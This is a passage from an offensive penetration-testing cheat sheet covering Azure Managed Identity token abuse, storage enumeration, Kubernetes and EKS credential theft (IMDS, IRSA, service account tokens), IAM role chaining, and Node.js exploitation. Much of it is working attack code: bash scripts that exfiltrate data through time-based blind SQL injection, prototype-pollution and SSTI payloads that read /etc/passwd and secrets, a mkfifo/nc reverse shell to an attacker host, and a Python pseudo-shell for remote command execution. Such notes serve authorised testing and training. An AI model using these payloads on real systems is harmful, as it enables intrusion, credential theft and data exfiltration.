# Check token claims (wids = directory roles, oid = object ID, xms_mirid = source resource)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool | grep -E "wids|oid|xms_mirid|appid"
```

### AzureHound with Managed Identity token
Managed Identity token can authenticate AzureHound directly:
```bash
./azurehound -j "<token>" list -o output.json
```
> If resources appear in the output.json — the Managed Identity has at least Reader on those resources. Use this to confirm scope and pivot further.

> SSRF vector: if App Service has SSRF — make it request IDENTITY_ENDPOINT on your behalf. Extract token, use from attacker machine.

---

## Azure AD Roles — What's Dangerous, What's Not

Azure AD has two types of roles:
- **Built-in roles** — standard Microsoft roles with fixed permissions
- **Custom roles** — created by tenant admins, always read the description carefully

### High-Priority (Dangerous) Roles

| Role | Why It's Dangerous |
|------|-------------------|
| Global Administrator | Full control over the entire tenant. Ultimate attack target |
| Privileged Role Administrator | Can assign any role including Global Admin |
| Privileged Authentication Administrator | Can reset password and MFA for any user (except Global Admin). Direct path to account takeover |
| Application Administrator | Can add credentials (secrets/certs) to any App Registration in the tenant |
| Cloud Application Administrator | Same as App Administrator but without Application Proxy access |
| User Access Administrator | Can assign RBAC roles on Azure resources |
| Owner (RBAC) | Full control over a resource including permission management |
| Contributor (RBAC) | Full control over a resource, cannot manage permissions |

### Low-Priority (Less Interesting) Roles

| Role | Why It's Not Interesting |
|------|-------------------------|
| Directory Readers | Reads basic directory info, no sensitive data |
| Printer Technician | Manages printers only |
| Attribute Definition Reader | Reads custom security attribute definitions |
| Attribute Assignment Reader | Reads custom security attribute values |
| Custom roles with narrow description | Read the description — if it covers only one object or process, likely not useful |

> Rule of thumb: any role with "Admin", "Privileged", or "Access" in the name — always investigate further.

### Attack Path Logic in BloodHound

Look for chains, not individual roles:
```
Your user → group → owns App → add secret to App →
login as Service Principal → SP has dangerous role → profit
```

Key edges that indicate an exploitation path:
- `AZOwner` — can fully control the target object
- `AZAppAdmin` — can add credentials to an App Registration
- `AZRunsAs` — App Registration is linked to a Service Principal
- `AZPrivilegedAuthAdmin` — can reset password and MFA
- `AZGlobalAdmin` — full tenant control
- `AZAddOwner` — can add themselves as owner of an object
- `AZAddMember` — can add themselves to a group

### What to Check When You See a Missing Link Between a Group and an App

If BloodHound shows a group and an App with no connection — check manually:
1. Whether any group member is an Owner of the App Registration
2. Whether the group has rights via a custom role at the App level
3. Whether there is an indirect connection through another group or Service Principal

---

## BloodHound (Azure AD)

Visualizes attack paths in Azure AD. Equivalent to BloodHound for on-prem AD.

**BloodHound methodology:**
1. Start from your own user — click on it, inspect all outbound edges
2. Move to groups you're a member of — what can those groups do
3. Use pre-built queries: `Shortest Path to Global Admin`, `Principals with Privileged Roles`
4. Pay attention to App Registrations and Service Principals — they often have excessive permissions
5. Build the attack chain from your user toward the highest privileges

**BloodHound + manual recon — how to combine:**
- BloodHound shows relationships: who is in which group, which roles are assigned, attack paths
- BloodHound does NOT show what resources actually contain or what a custom role specifically allows
- Manual recon fills the gap: check role definitions, enumerate resources, read actual data
- Workflow: BloodHound finds the "who has access to what" → manual recon finds "what is actually there"

**When BloodHound shows a custom role — always check the definition:**
```bash
az role definition list --query "[?roleName=='<custom role name>']" -o json
# Look at: actions, dataActions — these define exactly what the role can do
```

```bash
# AzureHound — collect Azure AD data
./azurehound -u <user> -p <pass> list --tenant <tenantId> -o output.json

# Import into BloodHound CE and analyze attack paths
```

---

## Azure Blob Storage — Pentest Methodology

Blob Storage is Azure's equivalent of S3. Containers have three access levels:
- **Private** — requires authentication and explicit role (Storage Blob Data Reader minimum)
- **Blob** — anonymous read access to individual blobs (no container listing)
- **Container** — full anonymous read including container listing

### Attack vectors
1. **Anonymous public container** — no auth required, directly accessible via URL
2. **Credentials in blobs** — config files, XML, JSON with hardcoded secrets
3. **Overprivileged user** — low-priv user with Storage Blob Data Reader can download everything
4. **SAS token leak** — Shared Access Signature in URL gives time-limited access without login

### Enumeration flow
```bash
# Step 1 — find storage accounts in scope
az storage account list --output table

# Step 2 — check anonymous access (no auth)
curl "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"

# Step 3 — list containers (authenticated)
az storage container list --account-name <account> --auth-mode login --output table

# Step 4 — list all blobs in container
az storage blob list --account-name <account> --container-name <container> --auth-mode login --output table

# Step 5 — download interesting files
az storage blob download --account-name <account> --container-name <container> \
  --name <file> --auth-mode login --file /tmp/<file>
```

### Black-box container enumeration (no credentials)
```bash
# Check if account-level anonymous listing is enabled
curl -s "https://<account>.blob.core.windows.net/?comp=list"

# Brute-force common container names
for c in backup backups data files config configs dev staging prod logs scripts ssh keys secrets documents images uploads private internal archive; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://<account>.blob.core.windows.net/$c?restype=container&comp=list")
  echo "$c → $code"
done
# 200 = public container, 403 = exists but private, 404 = does not exist
```

### What to look for in downloaded files
- Plaintext passwords, connection strings
- API keys, tokens, certificates
- Internal IP addresses, hostnames
- SSH private keys

---

## Azure Table Storage

NoSQL key-value storage. Often used for structured data — customer lists, logs, config records. Separate from Blob Storage — requires different roles and commands.

Required role: `Microsoft.Storage/storageAccounts/tableServices/tables/entities/read` — often assigned via custom roles. Check custom role definitions carefully, they may grant table access without obvious naming.

```bash
# List tables in storage account
az storage table list --account-name <account> --auth-mode login --output table

# Read all entities from a table
az storage entity query --account-name <account> --table-name <table> --auth-mode login

# Filter entities
az storage entity query --account-name <account> --table-name <table> \
  --filter "PartitionKey eq '<value>'" --auth-mode login
```

> Custom roles with `tableServices/tables/entities/read` are easy to miss — always check role definitions with `az role definition list` when you find a group with a non-standard role name.

---

## Azure Function App

Serverless compute — code runs on HTTP trigger without managing infrastructure. Equivalent to AWS Lambda. The app has an API endpoint and commonly connects to a backend database. Same web vulnerabilities apply: SQLi, command injection, SSRF.

### Enumeration via management API
```bash
# Requires at least Reader on the resource group

# PowerShell (from Kudu or Az module)
$authHeader = @{ Authorization = "Bearer $token" }
$sub = "<subscriptionId>"
$rg = "<resourceGroup>"
$fn = "<functionAppName>"

# List all functions and their invoke URLs
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$sub/resourceGroups/$rg/providers/Microsoft.Web/sites/$fn/functions?api-version=2019-08-01" -Headers $authHeader | Select-Object -ExpandProperty value

# Bash equivalent
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Web/sites/<fn>/functions?api-version=2019-08-01" \
  | python3 -m json.tool
```

The response contains `invoke_url_template` — the callable HTTP endpoint. Structure is always:
```
https://<functionapp>.azurewebsites.net/api/<function_name>
```

### SQL Injection — testing methodology

Function Apps often accept JSON input and query a backend SQL database without parameterization:
```sql
-- Vulnerable pattern
SELECT * FROM subscribers WHERE Email = '$email';
```

**Step 1 — confirm the endpoint accepts input:**
```bash
curl -s https://<fn>.azurewebsites.net/api/<trigger> \
  -d '{"email": "test@example.com"}'
```

**Step 2 — test for error-based SQLi** (single quote):
```bash
curl -s https://<fn>.azurewebsites.net/api/<trigger> \
  -d '{"email": "'"'"'"}'
# If error in response → error-based SQLi possible
# If empty response → blind SQLi, continue with time-based
```

**Step 3 — confirm database type and time-based SQLi:**
```bash
# MSSQL
time curl -s https://<fn>.azurewebsites.net/api/<trigger> \
  -d '{"email": "'"'"' WAITFOR DELAY '"'"'0:0:05'"'"'--"}'

# MySQL
time curl -s https://<fn>.azurewebsites.net/api/<trigger> \
  -d '{"email": "'"'"' sleep(5)--"}'

# PostgreSQL
time curl -s https://<fn>.azurewebsites.net/api/<trigger> \
  -d '{"email": "'"'"'; SELECT pg_sleep(5)--"}'
```
> If response takes ~5 seconds → time-based blind SQLi confirmed.

### Time-based blind SQLi — data exfiltration (MSSQL)

Exfiltrate character by character using `WAITFOR DELAY`. If condition is TRUE → server delays → we read the result.

**Find table name length:**
```bash
#!/bin/bash
URL="https://<fn>.azurewebsites.net/api/<trigger>"
curl -s -X POST "$URL" --data '{"email": "warmup"}' > /dev/null  # warmup to avoid false positive on first request

for ((i = 1; i <= 50; i++)); do
    SECONDS=0
    curl -s -X POST "$URL" --data @<(cat <<EOF
{"email": "' IF (SELECT LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U')))=$i WAITFOR DELAY '0:0:08'--"}
EOF
) > /dev/null
    if [ $SECONDS -gt 7 ]; then
        echo "Table name length: $i"
        break
    fi
    echo "Length $i - no match (${SECONDS}s)"
done
```

**Extract table name character by character:**
```bash
#!/bin/bash
URL="https://<fn>.azurewebsites.net/api/<trigger>"
TABLE_LEN=<n>  # from previous script
curl -s -X POST "$URL" --data '{"email": "warmup"}' > /dev/null

found_chars=""
for ((i = 1; i <= TABLE_LEN; i++)); do
    for j in $(seq 97 122) $(seq 48 57) 95; do  # a-z, 0-9, underscore
        SECONDS=0
        curl -s -X POST "$URL" --data @<(cat <<EOF
{"email": "'IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),$i,1)))=$j WAITFOR DELAY '00:00:08'--"}
EOF
) > /dev/null
        if [ $SECONDS -gt 7 ]; then
            char=$(printf "\\x$(printf '%x' $j)")
            found_chars+="$char"
            echo "Position $i: $char  →  so far: $found_chars"
            break
        fi
    done
done
echo "Table Name: $found_chars"
```

> Use WAITFOR delay of 8 seconds and threshold of 7 to absorb network jitter. The first request warmup prevents false positives from TCP connection setup latency. `sysobjects WHERE xtype='U'` selects only user-defined tables, not system tables. `TOP 1` gets the first table — increment with `OFFSET` to get subsequent ones.

### Attack chain summary
```
Compromised low-priv account
  → App Service with Managed Identity (visible in Kudu env vars)
  → Token request from IDENTITY_ENDPOINT
  → management API: list resources in resource group
  → discover Function App name and invoke URL
  → HTTP trigger accepts user input → SQL injection
  → blind time-based exfiltration → database contents
```

---

# Kubernetes / EKS

## Setup — Variables Inside a Pod

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

> These files are automatically mounted in every pod. `APISERVER` is always reachable at this address from inside the cluster.

### Who am I?

```bash
# Decode JWT token — check "sub" field: system:serviceaccount:<namespace>:<name>
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool | grep sub
```

---

## Kubernetes — Enumeration

### List namespaces

```bash
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | python3 -m json.tool | grep '"name"'
```

### List pods

```bash
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/<namespace>/pods | python3 -m json.tool
```

### List secrets

```bash
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/<namespace>/secrets | python3 -m json.tool
```

### Read a specific secret

```bash
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/<namespace>/secrets/<secret-name> \
  | python3 -m json.tool
# Values are base64 encoded — decode: echo "<value>" | base64 -d
```

---

## Kubernetes — RBAC Enumeration

### What can I do in a namespace?

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" \
  | python3 -m json.tool
```

### Check permissions across all namespaces

```bash
for ns in default kube-system monitoring staging production; do
  echo "=== $ns ==="
  curl -s --cacert $CACERT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
    -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$ns\"}}" \
    | python3 -m json.tool | grep -E "verbs|resources"
done
```

> Cross-namespace RBAC misconfiguration: a service account in namespace A has a RoleBinding in namespace B. Always check permissions in every namespace, not just the current one.

### Check a specific action

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"kube-system","verb":"list","resource":"secrets"}}}' \
  | python3 -m json.tool
# "allowed": true = you have access
```

---

## Kubernetes — CronJobs

Scheduled tasks. Backup CronJobs often contain S3 bucket names and credentials in `command`, `args`, or `env`.

```bash
# List CronJobs in a namespace
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/batch/v1/namespaces/<namespace>/cronjobs \
  | python3 -m json.tool

# List CronJobs across all namespaces (requires ClusterRole)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/batch/v1/cronjobs \
  | python3 -m json.tool

# Read CronJob spec — look for S3 buckets, AWS keys, commands
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/batch/v1/namespaces/<namespace>/cronjobs/<name> \
  | python3 -m json.tool | grep -A5 -E "command|args|env|value|S3|bucket|AWS"

# List completed Jobs
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/batch/v1/namespaces/<namespace>/jobs \
  | python3 -m json.tool
```

---

## EKS — IMDS from Inside a Pod

If IMDSv1 is enabled or hop limit > 1, pod traffic reaches the Node's IMDS and returns the Node IAM role credentials.

```bash
# Get the IAM role name attached to the Node
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials for that role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

```bash
# Export on attacker machine and use as AWS credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>

aws sts get-caller-identity
# Returns: assumed-role/<node-role-name>/<instance-id>
```

> Credentials expire (~1h). Re-run the curl from inside the pod to get fresh ones.

---

## EKS — SSM Session on EC2 Node

No SSH needed. Requires `ssm:StartSession` permission on the IAM credentials.

```bash
# Get Instance ID from Kubernetes node info
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes | python3 -m json.tool | grep "providerID"
# providerID: aws:///us-west-2a/i-0abc123def456 ← instance ID

# Or via AWS CLI
aws ec2 describe-instances --region <region> \
  --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress]' \
  --output table

# Open shell on Node
aws ssm start-session --target <instance-id> --region <region>
```

> SSM requires no open ports and leaves no traces in auth.log.

---

## EKS — containerd: Exec into Any Container on the Node

After SSM shell on the Node, use `ctr` to exec into any running container including databases.

```bash
# List all containers
sudo ctr -n k8s.io containers list

# List running tasks (containers with active processes)
sudo ctr -n k8s.io tasks list

# Find database container by name
sudo ctr -n k8s.io containers list | grep -i "postgres\|mysql\|mongo\|db"

# Exec into container
sudo ctr -n k8s.io tasks exec --exec-id pwn <container-id> sh
```

> `-n k8s.io` is the containerd namespace for Kubernetes (not a K8s namespace). `--exec-id` is an arbitrary string — use anything.

---

## PostgreSQL — Connect via Unix Socket

Inside a database container, the Unix socket connection bypasses network auth. If `pg_hba.conf` has `local all postgres trust` — no password needed.

```bash
psql -U postgres
# or
psql -U postgres -h /var/run/postgresql
```

```sql
\l                          -- list databases
\c <database>               -- connect to database
\dt                         -- list tables
\d <table>                  -- describe table schema
SELECT * FROM users LIMIT 10;
SELECT * FROM aws_credentials;
\q                          -- quit
```

---

## Prototype Pollution (Node.js)

### How to identify a vulnerable merge function

```javascript
// Vulnerable pattern — iterates user-supplied keys without filtering __proto__
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object') {
      deepMerge(target[key], source[key])  // deepMerge(Object.prototype, payload)
    } else {
      target[key] = sourceVal              // Object.prototype[key] = value
    }
  }
}
// Fix would be: if (key === '__proto__' || key === 'constructor') continue;
```

> `JSON.parse` treats `__proto__` as a regular own key. `Object.keys()` returns it. The merge writes into `Object.prototype` — affecting every object in the Node.js process.

### Confirm pollution is working

```bash
# Send test payload
curl -s -X PATCH /api/<endpoint> \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"testpwned": "yes"}}'

# If a subsequent response contains testpwned anywhere — pollution works
# Alternative key if __proto__ is filtered:
# {"constructor": {"prototype": {"testpwned": "yes"}}}
```

### EJS RCE via polluted outputFunctionName

EJS inserts `outputFunctionName` directly into generated JS code without sanitization. Polluting it via `Object.prototype` causes RCE on the next template render.

```json
{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('id').toString()//"}}
```

> Step 1: send pollution via PATCH to the merge endpoint.
> Step 2: trigger EJS render via GET on any page that renders a template.
> The polluted property is picked up during template compilation.

### Read files via error reflection (blind RCE without reverse shell)

`execSync` throws on command failure and Node.js reflects the error message in the HTTP response. Use this to read files without an outbound connection.

```json
{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token').toString()//"}}
{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('cat /etc/passwd').toString()//"}}
{"__proto__": {"outputFunctionName": "x;require('child_process').execSync('env').toString()//"}}
```

### Reverse shell — use exec not execSync

`execSync` blocks the Node.js event loop — the server hangs and becomes unreachable. Use async `exec` for long-running processes.

```json
{"__proto__": {"outputFunctionName": "x;require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f').toString()//"}}
```

```bash
# Listener on attacker machine
nc -lvnp <PORT>
```

> `/dev/tcp` only works in bash. Alpine/busybox containers have `sh` which doesn't support it — use mkfifo+nc instead.

---

## IDOR — Insecure Direct Object Reference

Server returns data/performs action based on user-supplied ID without verifying ownership.

### Detect
Look for IDs in URL params, POST body, JSON, cookies:
```
GET /api/users/1337/profile
GET /api/orders/9821
POST /api/reset-password  {"userId": 1}
```

### Exploit
Enumerate IDs — try other users' IDs, admin IDs (0, 1, admin):
```bash
# Brute-force IDs with ffuf
ffuf -u "http://<target>/api/users/FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0009.txt

# Or manually — change userId/orderId/reportId in Burp Repeater
```
> Common targets: password reset, profile data, file download, order history, admin functions.
> Always check both GET (read) and POST/PUT/DELETE (write/delete other users' data).

---

## SSTI / SSJI — Node.js Template Injection → RCE

**SSTI** = user input passed to a template engine (Handlebars, Pug, EJS, Nunjucks) without sanitization.
**SSJI** = same result via direct `eval()` or `Function()`.

In Node.js both lead to the same outcome — JavaScript execution in the server process with access to `global`, `process`, `require`.

### Attack chain
```
IDOR → admin access → admin panel feature (report gen, preview, export) → SSTI → RCE
```

### Detect — probe with template syntax
```
{{7*7}}          → Handlebars / Nunjucks / Twig
#{7*7}           → Pug / Slim
${7*7}           → EJS / template literals
<%= 7*7 %>       → EJS
```
> `49` in response = template evaluated your input. Generic error = possibly still vulnerable but throws.

### RCE payload (Node.js template engines)
```
global.process.mainModule.require("child_process").execSync("id").toString()
```
> Works in Handlebars, Pug, EJS, Nunjucks — any engine that evaluates JS expressions in the Node.js global scope.

### POST parameter injection
```bash
curl -s -X POST http://<target>/admin/reports \
  -d 'template=global.process.mainModule.require("child_process").execSync("id").toString()'
```

### Python pseudo-shell for SSJI endpoint

Wrap commands in base64 to avoid quote escaping issues in the JS payload:

```python
#!/usr/bin/env python3
import requests, base64
from bs4 import BeautifulSoup

URL = "http://<target>/admin/reports"

def execute(cmd):
    cmd_b64 = base64.b64encode(f"{cmd} 2>&1 || true".encode()).decode()
    payload = (
        f'global.process.mainModule.require("child_process")'
        f'.execSync("echo {cmd_b64}|base64 -d|sh").toString()'
    )
    resp = requests.post(URL, data={"template": payload}, timeout=15)
    soup = BeautifulSoup(resp.text, "html.parser")
    pre = soup.find("pre", class_="mb-0")
    return pre.get_text().strip() if pre else "[no output]"

while True:
    cmd = input("$ ").strip()
    if cmd == "exit": break
    if cmd: print(execute(cmd))
```

> `2>&1 || true` — forces exit 0 so `execSync` doesn't throw and app returns output instead of generic error.
> App shows "Report generation error" when execSync throws (non-zero exit) — always append `|| true`.

---

## EKS — IRSA via kubectl exec into another pod

When you have `pods/exec` in a namespace and pods there have IRSA configured — steal their token and assume the role from your attacker machine.

### 1. Find pods with IRSA
```bash
kubectl exec <pod> -n <namespace> -- env | grep -E "AWS_ROLE_ARN|AWS_WEB_IDENTITY_TOKEN_FILE"
```
> `AWS_ROLE_ARN` + `AWS_WEB_IDENTITY_TOKEN_FILE` present = IRSA configured.

### 2. Read the token
```bash
kubectl exec <pod> -n <namespace> -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### 3. Assume the role from attacker machine
```bash
aws sts assume-role-with-web-identity \
  --role-arn <AWS_ROLE_ARN> \
  --role-session-name pentest \
  --web-identity-token <token> \
  --region <region>

export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>

aws sts get-caller-identity
```

> Token is a JWT signed by EKS OIDC. AWS STS trusts it because the role's Trust Policy allows `sts:AssumeRoleWithWebIdentity` from that OIDC provider + specific serviceaccount.
> Token expires — re-read from pod if credentials stop working.

---

## IAM Role Chaining

When a role has `sts:AssumeRole` on another role — chain assumptions to escalate privileges.

### Detect
Read attached policies on current role → look for `sts:AssumeRole` action:
```bash
aws iam list-attached-role-policies --role-name <role> --profile <profile>
aws iam get-policy --policy-arn <arn> --profile <profile>
aws iam get-policy-version --policy-arn <arn> --version-id <v> --profile <profile>
# Look for: "Action": "sts:AssumeRole", "Resource": "arn:aws:iam::<account>:role/<target>"
```

### Assume the next role
```bash
aws sts assume-role \
  --role-arn <target-role-arn> \
  --role-session-name pentest \
  --profile <current-profile>

# Export creds and verify
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
aws sts get-caller-identity
```

### Enumerate elevated role policies (use previous role's IAM view permissions)
```bash
# If elevated role has no IAM read — use previous role to enumerate it
aws iam list-attached-role-policies --role-name <elevated-role> --profile <previous-profile>
aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile <previous-profile>
```

> Pattern: RoleA (IRSA) → `sts:AssumeRole` → RoleB (elevated) → DynamoDB/S3/Secrets Manager
> Always enumerate ALL roles in the chain before executing — map the full path first.

---

## kubectl — Pentest Playbook

### Setup — inside a pod without kubeconfig
kubectl автоматично підхоплює service account token якщо запускається всередині пода:
```bash
# Перевір що token є
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Якщо kubectl не в PATH — знайди бінарник
find / -name kubectl 2>/dev/null
/app/kubectl version
```

### Who am I?
```bash
# Поточний service account
kubectl config current-context
# або через token
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool | grep sub
# sub: system:serviceaccount:<namespace>:<serviceaccount-name>
```

### Enumerate permissions
```bash
# Поточний namespace
kubectl auth can-i --list

# Конкретний namespace
kubectl auth can-i --list -n <namespace>

# Перевірити одну дію
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i exec pods -n analytics
```

### Namespace & resource discovery
```bash
kubectl get namespaces
kubectl get pods -n <namespace>
kubectl get pods -A                          # всі namespaces (якщо є права)
kubectl get secrets -n <namespace>
kubectl get serviceaccounts -n <namespace>
kubectl get deployments -n <namespace>
kubectl get cronjobs -n <namespace>
kubectl describe pod <pod-name> -n <namespace>  # деталі пода + env vars
```

### Exec into a pod
```bash
# Інтерактивний shell
kubectl exec -it <pod> -n <namespace> -- sh
kubectl exec -it <pod> -n <namespace> -- bash

# Одна команда без інтерактиву
kubectl exec <pod> -n <namespace> -- env
kubectl exec <pod> -n <namespace> -- cat /etc/passwd
kubectl exec <pod> -n <namespace> -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### Read secrets
```bash
kubectl get secret <name> -n <namespace> -o json
# Values are base64 encoded
kubectl get secret <name> -n <namespace> -o jsonpath='{.data.<key>}' | base64 -d
```

### Read pod logs
```bash
kubectl logs <pod> -n <namespace>
kubectl logs <pod> -n <namespace> --previous   # якщо pod перезапустився
```

> `kubectl auth can-i --list` може повертати неповний список якщо кластер використовує webhook authorizer — warning "the list may be incomplete". Права реально є, просто webhook не підтримує self-review. Перевіряй конкретні дії через `can-i get secrets -n <ns>`.

---

## EKS — RBAC Cross-Namespace Enumeration (kubectl)

```bash
# Current namespace permissions
kubectl auth can-i --list

# Specific namespace — check each non-default namespace
kubectl auth can-i --list -n <namespace>

# High-value permissions to look for
# pods/exec   → exec into any pod in that namespace
# secrets     → read all secrets
# pods/log    → read pod logs (may contain creds)
```

> Default namespaces (ignore): `default`, `kube-system`, `kube-node-lease`, `kube-public`
> Always check ALL custom namespaces — service account may have elevated rights in a different namespace than where its pod runs.

---

